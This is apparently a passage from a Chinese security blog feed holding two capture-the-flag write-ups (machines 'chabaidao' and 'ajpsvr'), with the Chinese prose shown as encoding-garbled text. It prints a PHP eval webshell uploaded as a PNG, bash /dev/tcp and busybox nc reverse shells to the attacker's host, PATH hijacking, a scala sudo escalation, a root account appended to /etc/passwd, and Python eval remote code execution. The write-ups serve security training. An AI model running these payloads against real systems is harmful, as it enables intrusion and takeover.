        print(f'ÊèêÂèñÂÆåÊàê -&gt; {fout}')

    except Exception as e:
        print(f'ÈîôËØØ: {e}')

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print('Áî®Ê≥ï: python3 extract.py &lt;ËæìÂÖ•wav&gt; &lt;ËæìÂá∫Êñá‰ª∂&gt;')
        sys.exit(1)
    
    ext(sys.argv[1], sys.argv[2])
                                  
```

ÊâßË°åËÑöÊú¨ÂêéÔºåÊàë‰ª¨ÂæóÂà∞‰∫Ü‰∏Ä‰∏™Âêç‰∏∫ `a` ÁöÑÊñá‰ª∂„ÄÇ‰ΩøÁî® `strings` ÂëΩ‰ª§Êü•ÁúãËøô‰∏™Êñá‰ª∂ÁöÑÂÜÖÂÆπÔºåÂú®ÂºÄÂ§¥ÈÉ®ÂàÜÂèëÁé∞‰∫Ü‰∏ÄÁªÑÂá≠ÊçÆ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ python3 lsb.py music.wav a
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ strings a |head -n 10 
admin@liverpool12
z       K&gt;p
aLPu
pQV=i
$1]4
UDPs
$$@D
n&gt;h'2
gu]@
TeHE$Zd
```

Êàë‰ª¨ÊàêÂäüÊâæÂà∞‰∫ÜÈöêËóèÁöÑÂØÜÁ†ÅÔºö`admin@liverpool12`„ÄÇ

# ‰∏â„ÄÅÂàùÂßãËÆøÈóÆ

## 1. ÂêéÂè∞ÁôªÂΩï‰∏éÊñá‰ª∂‰∏ä‰º†

‰ΩøÁî® `admin@`chabaidao.dsz ÈÇÆÁÆ±ÂíåÂàöÊâæÂà∞ÁöÑÂØÜÁ†Å `admin@liverpool12` ÊàêÂäüÁôªÂΩï‰∫Ü‰∏ªÁ´ô `http://chabaidao.dsz/` ÁöÑÂêéÂè∞„ÄÇ

![image-20250717225850690](https://7r1UMPHK.github.io/image/20250717225851014.webp)

ÂêéÂè∞‰∏™‰∫∫ËµÑÊñôÈ°µÈù¢Êúâ‰∏Ä‰∏™Â§¥ÂÉè‰∏ä‰º†ÂäüËÉΩÔºåÊèêÁ§∫Âè™ÂÖÅËÆ∏‰∏ä‰º†ÂõæÁâáÊ†ºÂºè„ÄÇËøôÊòØ‰∏Ä‰∏™ÂÖ∏ÂûãÁöÑÁ™ÅÁ†¥Âè£„ÄÇÊàë‰ª¨ÈááÁî®‰ª•‰∏ãÊ≠•È™§ÁªïËøáÈôêÂà∂Ôºö

1.  ÂáÜÂ§á‰∏Ä‰∏™ËöÅÂâëÁöÑant.phpÊñá‰ª∂ÔºåÂ∞ÜÂÖ∂ÊîπÂêç‰∏∫ant.pngËøõË°å‰∏ä‰º†(phpÂèçÂºπshellÊó†Ê≥ïÊúâÊïàÊâßË°å)

&gt; ```
&gt; ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
&gt; ‚îî‚îÄ$ cat ant.png
&gt; &lt;?php eval($_POST['ant']); ?&gt;
&gt; ```

1.  ‰ΩøÁî® Burp Suite Êã¶Êà™Êñá‰ª∂‰∏ä‰º†ÁöÑËØ∑Ê±Ç„ÄÇ
2.  Â∞ÜËØ∑Ê±Ç‰∏≠ÁöÑÊñá‰ª∂Âêç‰ªé `ant.png` ‰øÆÊîπ‰∏∫ `ant.php`„ÄÇ
3.  ÂèëÈÄÅ‰øÆÊîπÂêéÁöÑËØ∑Ê±ÇÔºåÂç≥ÂèØÊàêÂäü‰∏ä‰º† `any.php`„ÄÇ
4.  ‰∏ä‰º†ÊàêÂäüÔºåÊü•ÁúãÂ§¥ÂÉèÊ∫êÁ†ÅËé∑Âæóurl„ÄÇ

5.  ‰ΩøÁî®ËöÅÂâëËøõË°åËøûÊé•„ÄÇ

![image-20250717230617743](https://7r1UMPHK.github.io/image/20250717230617972.webp)

## 2. ÂèçÂºπ Shell

Âú®ÊîªÂáªÊú∫ÔºàKaliÔºâ‰∏äÁõëÂê¨Á´ØÂè£Ôºö

```bash
nc -lvnp 8888
```

Âú®ËöÅÂâëÁöÑËôöÊãüÁªàÁ´ØÂºπshellÂõûÂéªkaliÔºåÊñπ‰æøÊìç‰Ωú„ÄÇ

ÊîªÂáªÊú∫ÊàêÂäüÊé•Êî∂Âà∞ËøûÊé•ÔºåËé∑Âæó‰∫Ü `www-data` Áî®Êà∑ÁöÑ Shell„ÄÇ‰∏∫Êñπ‰æøÂêéÁª≠Êìç‰ΩúÔºåÂçáÁ∫ß‰∏∫ÂäüËÉΩÈΩêÂÖ®ÁöÑ TTY„ÄÇ

```bash
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm  
export TERM=xterm  
export SHELL=/bin/bash  
stty rows 24 columns 80
```

# Âõõ„ÄÅÊùÉÈôêÊèêÂçá

## 1. ÊèêÊùÉËá≥ welcome (PATH Âä´ÊåÅ)

Ëé∑Âæó‰∫Ü `www-data` ÁöÑ Shell ÂêéÔºåÈ¶ñÂÖàÊ£ÄÊü• `sudo` ÊùÉÈôê„ÄÇ

```bash
www-data@Chabaidao:/tmp$ sudo -l
...
User www-data may run the following commands on Chabaidao:
    (welcome) NOPASSWD: /home/welcome/write
www-data@Chabaidao:/tmp$ cat /home/welcome/write 
#!/bin/bash

# Ê£ÄÊü•ÂèÇÊï∞Êï∞Èáè
if [ $# -lt 2 ]; then
    echo 'Áî®Ê≥ï: $0 &lt;Êñá‰ª∂Ë∑ØÂæÑ&gt; &lt;Ë¶ÅÂÜôÂÖ•ÁöÑÂÜÖÂÆπ&gt;'
    exit 1
fi

file_path='$1'
content='$2'

# Ê£ÄÊü•Êñá‰ª∂ÊòØÂê¶Â≠òÂú®
if [ ! -f '$file_path' ]; then
    echo 'ÈîôËØØÔºöÊñá‰ª∂ '$file_path' ‰∏çÂ≠òÂú®ÔºåÊó†Ê≥ïÂÜôÂÖ•„ÄÇ'
    exit 2
fi

# ÂÜôÂÖ•ÂÜÖÂÆπ
echo '$content' &gt; '$file_path'
echo 'ÂÜÖÂÆπÂ∑≤ÊàêÂäüÂÜôÂÖ•Âà∞ $file_path'
```

`www-data` Áî®Êà∑ÂèØ‰ª•ÂÖçÂØÜ‰ª• `welcome` Áî®Êà∑ÁöÑË∫´‰ªΩÊâßË°å `/home/welcome/write` ËÑöÊú¨„ÄÇÂèØ‰ª•ÁúãÂá∫wirteËÑöÊú¨ÊòØ‰ª•welcomeÁî®Êà∑ÂÆûÁé∞ÂÜôÂÖ•ÁöÑ‰∏Ä‰∏™ËÑöÊú¨ÔºåÂπ∂‰∏îÈÄöËøáËøõÁ®ãÁõëÊéßÂèëÁé∞ `welcome` Áî®Êà∑‰ºöÂÆöÊó∂ÊâßË°å `/home/welcome/chabaidao` ËÑöÊú¨ÔºåËØ•ËÑöÊú¨‰ºöËØªÂèñ `/home/welcome/myfile` ÁöÑÂÜÖÂÆπ‰Ωú‰∏∫ `PATH` ÁéØÂ¢ÉÂèòÈáè„ÄÇËøôÊòØÂÖ∏ÂûãÁöÑ **PATH ÁéØÂ¢ÉÂèòÈáèÂä´ÊåÅ** ÊèêÊùÉË∑ØÂæÑ„ÄÇ

1. Âú® `www-data` Áî®Êà∑ÂèØÂÜôÁöÑÁõÆÂΩïÔºàÂ¶Ç `/dev/shm`Ôºâ‰∏ãÂàõÂª∫‰∏Ä‰∏™Âêç‰∏∫ `file` ÁöÑÊÅ∂ÊÑèËÑöÊú¨ÔºåÂÜÖÂÆπ‰∏∫ÂèçÂºπ Shell ÂëΩ‰ª§ÔºåÂπ∂Ëµã‰∫àÊâßË°åÊùÉÈôê„ÄÇ

   ```bash
   www-data@Chabaidao:/tmp$ cd /dev/shm/  
   www-data@Chabaidao:/dev/shm$ cat &gt; file &lt;&lt; 'EOL'
   &gt; #!/bin/bash
   &gt; bash -c '/bin/bash -i &gt;&amp; /dev/tcp/192.168.205.128/8888 0&gt;&amp;1'
   &gt; EOL
   www-data@Chabaidao:/dev/shm$ chmod +x file
   ```

2. Âà©Áî® `www-data` ÁöÑ `sudo` ÊùÉÈôêÔºå‰ª• `welcome` Ë∫´‰ªΩÊâßË°å `write` ËÑöÊú¨ÔºåÂ∞ÜÊàë‰ª¨ÁöÑÊÅ∂ÊÑèËÑöÊú¨ÊâÄÂú®ÁõÆÂΩï `/dev/shm` Ê∑ªÂä†Âà∞ `/home/welcome/myfile` ÂÆö‰πâÁöÑ `PATH` ÂèòÈáèÁöÑÊúÄÂâçÈù¢„ÄÇ

   ```bash
   www-data@Chabaidao:/dev/shm$ echo '/dev/shm/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games' &gt; /tmp/a
   www-data@Chabaidao:/dev/shm$ sudo -u welcome /home/welcome/write /home/welcome/myfile '$(cat /tmp/a)'
   ```

3. Âú®ÊîªÂáªÊú∫‰∏äÁõëÂê¨ 8888 Á´ØÂè£ÔºåÁ≠âÂæÖÂÆöÊó∂‰ªªÂä°ÊâßË°å„ÄÇÂΩì `chabaidao` ËÑöÊú¨ÊâßË°åÊó∂ÔºåÂÆÉ‰ºö‰ΩøÁî®Êàë‰ª¨ÁØ°ÊîπÂêéÁöÑ `PATH`Ôºå‰ªéËÄå‰ºòÂÖàÊâßË°å‰∫Ü `/dev/shm/file`ÔºåÊàë‰ª¨Â∞±Ëé∑Âæó‰∫Ü `welcome` Áî®Êà∑ÁöÑ Shell„ÄÇ

## 2. ÊèêÊùÉËá≥ root (Scala Sudo ÊèêÊùÉ)

ÊãøÂà∞ `welcome` Áî®Êà∑ÁöÑ Shell ÂêéÔºåÂÜçÊ¨°Ê£ÄÊü• `sudo` ÊùÉÈôê„ÄÇ

```bash
welcome@Chabaidao:~$ sudo -l
...
User welcome may run the following commands on Chabaidao:
    (ALL) NOPASSWD: /usr/bin/scala
```

`welcome` Áî®Êà∑ÂèØ‰ª•ÂÖçÂØÜ‰ª• `root` ÊùÉÈôêÊâßË°å `scala`„ÄÇÊàë‰ª¨ÂèØ‰ª•Âà©Áî® `scala` ÁöÑ‰∫§‰∫íÂºèËß£ÈáäÂô®Êù•ÊâßË°å‰ªªÊÑèÁ≥ªÁªüÂëΩ‰ª§„ÄÇ

1. ‰ª• `root` ÊùÉÈôêÂêØÂä® `scala` Ëß£ÈáäÂô®„ÄÇ

   ```bash
   sudo /usr/bin/scala
   ```

2. Âú® `scala` Ëß£ÈáäÂô®‰∏≠Ôºå‰ΩøÁî® `:sh` ÂëΩ‰ª§ÊâßË°å‰∏Ä‰∏™ shell ÂëΩ‰ª§Ôºå‰∏∫ `/bin/bash` Ê∑ªÂä† SUID ÊùÉÈôê‰Ωç„ÄÇ

   ```scala
   Welcome to Scala 2.11.12 ...
   Type in expressions for evaluation. Or try :help.
   
   scala&gt; :sh chmod +s /bin/bash
   res0: scala.tools.nsc.interpreter.ProcessResult = `chmod +s /bin/bash` (0 lines, exit 0)
   
   scala&gt; :quit
   ```

3. ÈÄÄÂá∫ `scala` ÂêéÔºåÊâßË°å `bash -p` Êù•Âà©Áî® SUID ‰ΩçÔºåËé∑Âæó‰∏Ä‰∏™ `euid=0` ÁöÑ root ÊùÉÈôê Shell„ÄÇ

   ```bash
   welcome@Chabaidao:~$ bash -p
   bash-5.0# id
   uid=1000(welcome) gid=1000(welcome) euid=0(root) egid=0(root) groups=0(root),1000(welcome)
   bash-5.0# whoami
   root
   bash-5.0#echo 'b:$1$AydoDDh4$tEky6m30.0nY3HZ8FgoGI0:0:0::/root:/bin/bash' &gt;&gt; /etc/passwd
   bash-5.0#su b
   Password: abcdefg
   root@Chabaidao:~# id
   uid=0(root) gid=0(root) groups=0(root)
   root@Chabaidao:~# cat /home/welcome/user.txt /root/root.txt 
   flag{user-12fc204edeae5b57713c5ad7dcb97d39}
   flag{root-12fc204edeae5b57713c5ad7dcb97d39}
   ```

ÊàêÂäüÊèêÊùÉËá≥ rootÔºåÊ∏óÈÄèÊµãËØïÂÆåÊàê„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_chabaidao.html</guid><pubDate>Fri, 18 Jul 2025 01:58:31 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_ajpsvr</title><link>https://7r1UMPHK.github.io/post/nei-bu-_ajpsvr.html</link><description>![image-20250716205953078](https://7r1UMPHK.github.io/image/20250716205953466.webp)

![image-20250716210011392](https://7r1UMPHK.github.io/image/20250716210011546.webp)

ÂìàÂìàÔºåÊï¥‰∏™Ê¥ªÔºåË°•‰∫õwp

# ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ‰∏éÊúçÂä°Êé¢Êµã

## 1. ‰∏ªÊú∫ÂèëÁé∞

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.190 08:00:27:b0:70:3d       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fb:d6:c6       VMware, Inc.

4 responded
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÔºåIP Âú∞ÂùÄ‰∏∫ 192.168.205.190

## 2. Á´ØÂè£‰∏éÊúçÂä°Êâ´Êèè

Á°ÆÂÆöÁõÆÊ†á IP ÂêéÔºå‰ΩøÁî® nmap ÂØπÂÖ∂ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•ÂèëÁé∞ÊâÄÊúâÂºÄÊîæÁöÑ TCP Á´ØÂè£ÂèäÂÖ∂‰∏äËøêË°åÁöÑÊúçÂä°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ nmap -p- 192.168.205.190
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-16 09:01 EDT
Nmap scan report for 192.168.205.190
Host is up (0.00026s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8010/tcp open  xmpp
```

ÁªìÊûúÊòæÁ§∫ÁõÆÊ†áÂºÄÊîæ‰∫Ü‰∏â‰∏™Á´ØÂè£Ôºö

- **22/tcp**: SSH ÊúçÂä°ÔºåÈÄöÂ∏∏Áî®‰∫éËøúÁ®ãÁôªÂΩï„ÄÇ
- **80/tcp**: HTTP ÊúçÂä°ÔºåÂç≥Ê†áÂáÜ Web ÊúçÂä°„ÄÇ
- **8010/tcp**: nmap ÂàùÊ≠•ËØÜÂà´‰∏∫ xmppÔºå‰ΩÜÈúÄË¶ÅËøõ‰∏ÄÊ≠•Á°ÆËÆ§„ÄÇ

# ‰∫å„ÄÅWeb Êé¢Á¥¢‰∏é AJP ‰ª£ÁêÜ

## 1. ÂàùÊé¢ 80 Á´ØÂè£

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ curl 192.168.205.190     
&lt;html&gt;
&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
                
```

‰ΩøÁî® gobuster ËøõË°åÁõÆÂΩïÁàÜÁ†¥‰πüÊú™ÂèëÁé∞‰ªª‰ΩïÊúâ‰ª∑ÂÄºÁöÑË∑ØÂæÑ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.190 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.190
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 1102795 / 1102800 (100.00%)
===============================================================
Finished
===============================================================
                                                    
```

## 2.8010 Á´ØÂè£‰∏é AJP

ÊÉÖÂÜµÊúâÁÇπ‰∏çÂØπÔºåÁúãÁúã8010ÊòØ‰ªÄ‰πàÊúçÂä°

```bash
PORT     STATE SERVICE VERSION
8010/tcp open  xmpp?
| fingerprint-strings: 
|   GenericLines: 
|_    ajpy
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8010-TCP:V=7.95%I=7%D=7/16%Time=6877A304%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,8,'\x124\0\x04ajpy');
MAC Address: 08:00:27:B0:70:3D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.81 seconds
                           
```

ÊêúÁ¥¢‰∫Ü‰∏Ä‰∏ã

![image-20250716210338088](https://7r1UMPHK.github.io/image/20250716210338218.webp)

ÈÄöËøáÊêúÁ¥¢ÔºåÊàë‰ª¨‰∫ÜËß£Âà∞ 8010 Á´ØÂè£ÂæàÂèØËÉΩËøêË°åÁùÄ **AJP (Apache JServ Protocol)** ÊúçÂä°„ÄÇ

&gt; [!Tip]
&gt;
&gt; **‰ªÄ‰πàÊòØ AJPÔºü**
&gt;
&gt; AJP ÊòØ‰∏Ä‰∏™‰∫åËøõÂà∂ÂçèËÆÆÔºåËÆæËÆ°Áî®‰∫éÂèçÂêë‰ª£ÁêÜÊúçÂä°Âô®ÔºàÂ¶Ç Apache HTTP ServerÔºâ‰∏éÂêéÁ´ØÁöÑÂ∫îÁî®ÊúçÂä°Âô®ÔºàÂ¶Ç Apache TomcatÔºâ‰πãÈó¥ËøõË°åÈÄö‰ø°„ÄÇÂÆÉÊØî HTTP Êõ¥È´òÊïàÔºåÂõ†‰∏∫ÂÆÉÂú®ËÆæËÆ°‰∏äÂáèÂ∞ë‰∫ÜÁΩëÁªúÂºÄÈîÄ„ÄÇÊàë‰ª¨‰∏çËÉΩÂÉèËÆøÈóÆÊôÆÈÄöÁΩëÈ°µ‰∏ÄÊ†∑Áõ¥Êé•ÈÄöËøáÊµèËßàÂô®ËÆøÈóÆ AJP ÊúçÂä°„ÄÇ

‰∏∫‰∫Ü‰∏é AJP ÊúçÂä°‰∫§‰∫íÔºåÊàë‰ª¨ÈúÄË¶ÅËÆæÁΩÆ‰∏Ä‰∏™Êú¨Âú∞‰ª£ÁêÜ„ÄÇËøôÈáåÊàë‰ª¨‰ΩøÁî® Apache httpd ÊúçÂä°Âô®ÁöÑ mod_proxy_ajp Ê®°ÂùóÔºåÂ∞ÜÊàë‰ª¨Êú¨Âú∞ÁöÑ 8000 Á´ØÂè£Êî∂Âà∞ÁöÑ HTTP ËØ∑Ê±ÇËΩ¨ÂèëÂà∞ÁõÆÊ†áÁöÑ 8010 Á´ØÂè£„ÄÇ

**‰ª£ÁêÜÈÖçÁΩÆÊ≠•È™§Ôºö**

1. ÂêØÁî® Apache ÁöÑÁõ∏ÂÖ≥‰ª£ÁêÜÊ®°ÂùóÔºö

   ```bash
   sudo apt-get install apache2
   sudo a2enmod proxy    
   sudo a2enmod proxy_http
   sudo a2enmod proxy_ajp        
   ```

2. ÂàõÂª∫‰∏Ä‰∏™Êñ∞ÁöÑ Apache Á´ôÁÇπÈÖçÁΩÆÊñá‰ª∂ `/etc/apache2/sites-available/ajp-proxy.conf`Ôºö

   ```apache
   Listen 8000
   &lt;VirtualHost *:8000&gt;
       ProxyPass / ajp://192.168.205.190:8010/
       ProxyPassReverse / ajp://192.168.205.190:8010/
   &lt;/VirtualHost&gt;
   ```

3. ÂêØÁî®ËØ•Á´ôÁÇπÂπ∂ÈáçÂêØ Apache ÊúçÂä°Ôºö

   ```bash
   sudo a2ensite ajp-proxy.conf
   sudo systemctl restart apache2
   ```

ÈÖçÁΩÆÂÆåÊàêÂêéÔºåËÆøÈóÆÊàë‰ª¨Ëá™Â∑±Êú∫Âô®ÁöÑ `http://127.0.0.1:8000` (Êàñ `http://192.168.205.128:8000`) Â∞±Áõ∏ÂΩì‰∫éÂú®ËÆøÈóÆÁõÆÊ†á `192.168.205.190:8010` ‰∏äÁöÑ Web Â∫îÁî®‰∫Ü„ÄÇ

![image-20250716210721870](https://7r1UMPHK.github.io/image/20250716210722060.webp)

# ‰∏â„ÄÅÊºèÊ¥ûÂà©Áî®‰∏éÂàùÂßãËÆøÈóÆ

‰ª£ÁêÜËÆæÁΩÆÊàêÂäüÂêéÔºåÊàë‰ª¨ÂÜçÊ¨°ÂØπ‰ª£ÁêÜÂêéÁöÑÂú∞ÂùÄËøõË°åÁõÆÂΩïÁàÜÁ†¥„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.128:8000 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip -t 64
===============================================================
/login                (Status: 200) [Size: 21]
/test                 (Status: 200) [Size: 12]
/backdoor             (Status: 200) [Size: 9]
===============================================================                             
```

ËøôÊ¨°Êàë‰ª¨ÂèëÁé∞‰∫Ü‰∏â‰∏™Ë∑ØÂæÑÔºö`/login`, `/test`, `/backdoor`„ÄÇ

## 1. ÁôªÂΩïÈ°µÈù¢ÁàÜÁ†¥

ÁªèËøáÊµãËØïÂèëÁé∞Ôºå`/login` Ë∑ØÂæÑÊé•Âèó‰∏Ä‰∏™ `password` ÂèÇÊï∞ÔºåÂπ∂ÊèêÁ§∫ÂØÜÁ†ÅÈïøÂ∫¶‰∏∫ 5„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ curl 'http://192.168.205.128:8000/login?password=test'
Password length is 5
```

ËøôÊöóÁ§∫Êàë‰ª¨ÈúÄË¶ÅÁàÜÁ†¥‰∏Ä‰∏™ÈïøÂ∫¶‰∏∫ 5 ÁöÑÂØÜÁ†Å„ÄÇÁÑ∂ËÄåÔºåÁõ¥Êé•‰ΩøÁî®Â∏∏ËßÑÂ≠óÂÖ∏ÁàÜÁ†¥‰ºöÈÅáÂà∞ÈóÆÈ¢òÔºåÂõ†‰∏∫ÂêéÁ´ØÂØπÁâπÊÆäÂ≠óÁ¨¶ÁöÑÈïøÂ∫¶ËÆ°ÁÆóÊñπÂºèÂèØËÉΩ‰∏éÊàë‰ª¨È¢ÑÊÉ≥ÁöÑ‰∏çÂêå„ÄÇÊ≠£Á°ÆÁöÑÂÅöÊ≥ïÊòØÂØπÂ≠óÂÖ∏‰∏≠ÁöÑÊØè‰∏Ä‰∏™ÂØÜÁ†ÅËøõË°å URL ÁºñÁ†Å„ÄÇ

1. ‰ªé `rockyou.txt` ‰∏≠Á≠õÈÄâÂá∫ÊâÄÊúâÈïøÂ∫¶‰∏∫ 5 ÁöÑÂØÜÁ†ÅÔºö

   ```bash
   grep -x '^.\{5\}$' /usr/share/wordlists/rockyou.txt &gt; 5z.txt
   ```

2. ‰ΩøÁî® Python ÂØπÁ≠õÈÄâÂêéÁöÑÂ≠óÂÖ∏ËøõË°å URL ÁºñÁ†ÅÔºö

   ```bash
   python3 -c 'import sys, urllib.parse; [print(urllib.parse.quote(line.strip())) for line in sys.stdin]' &lt; 5z.txt &gt; 5z_u.txt
   ```

3. ‰ΩøÁî® `ffuf` ÂíåÁºñÁ†ÅÂêéÁöÑÂ≠óÂÖ∏ËøõË°åÁàÜÁ†¥ÔºåÂπ∂ËøáÊª§ÊéâËøîÂõûÂÜÖÂÆπ‰∏∫Á©∫ÁöÑÂìçÂ∫î (`--fs 0`)Ôºö

   ```bash
   ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
   ‚îî‚îÄ$ ffuf -u 'http://192.168.205.128:8000/login?password=FUZZ' -w 5z_u.txt --fs 0
   ...
   %21%40%23%24%25         [Status: 200, Size: 25, Words: 1, Lines: 1, Duration: 2ms]
   ...
   ```

Êàë‰ª¨ÊâæÂà∞‰∫Ü‰∏Ä‰∏™ÊúâÊïàÁöÑÂØÜÁ†Å `%21%40%23%24%25`ÔºåÂÆÉËß£Á†ÅÂêéÊòØ `!@#$%`„ÄÇ

## 2. ÂêéÈó®‰∏éËøúÁ®ã‰ª£Á†ÅÊâßË°åÔºàRCEÔºâ

Áî®ÊâæÂà∞ÁöÑÂØÜÁ†ÅËÆøÈóÆÁôªÂΩïÈ°µÈù¢ÔºåËøîÂõû‰∫Ü‰∏Ä‰∏™Êñ∞ÁöÑË∑ØÂæÑÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ curl 'http://192.168.205.128:8000/login?password=%21%40%23%24%25'
/backdoooooooooooooooooor
```

ËÆøÈóÆËøô‰∏™ `/backdoooooooooooooooooor` Ë∑ØÂæÑÔºåÂπ∂Â∞ùËØï‰º†ÂÖ• `cmd` ÂèÇÊï∞ÊâßË°åÂëΩ‰ª§„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ curl 'http://192.168.205.128:8000/backdoooooooooooooooooor?cmd=id'
&lt;built-in function id&gt;
```

ËøîÂõûÁªìÊûú `&lt;built-in function id&gt;` Ë°®ÊòéÂêéÁ´ØÂæàÂèØËÉΩ‰ΩøÁî®‰∫Ü Python ÁöÑ `eval()` ÊàñÁ±ª‰ººÂáΩÊï∞Êù•ÊâßË°å‰ª£Á†ÅÔºåÂπ∂‰∏îÊ≤°ÊúâÂØºÂÖ• `os` Ê®°Âùó„ÄÇ‰∏∫‰∫ÜÊâßË°åÁ≥ªÁªüÂëΩ‰ª§ÔºåÊàë‰ª¨ÈúÄË¶ÅÂÖàÂØºÂÖ• `os` Ê®°Âùó„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ curl 'http://192.168.205.128:8000/backdoooooooooooooooooor?cmd=__import__('os').popen('whoami').read()'
welcome
```

ÊàêÂäüÊâßË°åÂëΩ‰ª§ÔºÅÊàë‰ª¨ÂΩìÂâçÁöÑÁî®Êà∑ÊòØ `welcome`„ÄÇ

## 3. ÂèçÂºπ Shell

‰∏∫‰∫ÜËé∑Âæó‰∏Ä‰∏™Êõ¥Á®≥ÂÆöÁöÑ‰∫§‰∫íÂºè ShellÔºåÊàë‰ª¨Âà©Áî®Ëøô‰∏™ RCE ÊºèÊ¥ûÂèçÂºπ‰∏Ä‰∏™ Shell Âà∞Êàë‰ª¨ÁöÑÊîªÂáªÊú∫‰∏ä„ÄÇÁõÆÊ†áÁ≥ªÁªü‰∏äÂ≠òÂú® `busybox`ÔºåÂÆÉÈõÜÊàê‰∫Ü `nc` (netcat) Â∑•ÂÖ∑„ÄÇ

1.  Âú®ÊîªÂáªÊú∫ÔºàKaliÔºâ‰∏äÁõëÂê¨ 8888 Á´ØÂè£Ôºö

```bash
nc -lvnp 8888
```

2.  ÈÄöËøá URL ÂèëÈÄÅÂèçÂºπ Shell ÁöÑ payloadÔºàÊ≥®ÊÑè `+` Âú® URL ‰∏≠‰ºöË¢´ËßÜ‰∏∫Á©∫Ê†ºÔºåËøôÈáåÊòØ `busybox` Â§öÂäüËÉΩ‰∫åËøõÂà∂Êñá‰ª∂ÁöÑÁî®Ê≥ïÔºâÔºö

```bash
curl 'http://192.168.205.128:8000/backdoooooooooooooooooor?cmd=__import__('os').popen('busybox+nc+192.168.205.128+8888+-e+/bin/bash').read()'
```

ÊîªÂáªÊú∫ÊàêÂäüÊé•Êî∂Âà∞ËøûÊé•ÔºåÊàë‰ª¨Ëé∑Âæó‰∫Ü `welcome` Áî®Êà∑ÁöÑ Shell„ÄÇ

## 4. Á®≥ÂÆö Shell Âπ∂Ëé∑ÂèñÁî®Êà∑ Flag

‰∏∫‰∫ÜÊõ¥Â•ΩÁöÑ‰∫§‰∫í‰ΩìÈ™åÔºåÊàë‰ª¨Â∞ÜËøô‰∏™ÁÆÄÈôãÁöÑ Shell ÂçáÁ∫ß‰∏∫ÂäüËÉΩÈΩêÂÖ®ÁöÑ TTY„ÄÇ

```bash
python -c 'import pty; pty.spawn('/bin/bash')'
Ctrl+Z
stty raw -echo; fg
reset xterm  
export TERM=xterm  
export SHELL=/bin/bash  
stty rows 24 columns 80
```

Âú® `welcome` Áî®Êà∑ÁöÑÂÆ∂ÁõÆÂΩï‰∏ãÔºåÊàë‰ª¨ÊâæÂà∞‰∫ÜÁ¨¨‰∏Ä‰∏™ flag„ÄÇ

```bash
localhost:~$ ls -al
...
-rw-r--r--    1 root     welcome         39 Jul 14 15:11 user.txt
localhost:~$ cat user.txt
flag{5a80870310e5a3bc10c00ef6d20a3cac}
```

# Âõõ„ÄÅÊùÉÈôêÊèêÂçá

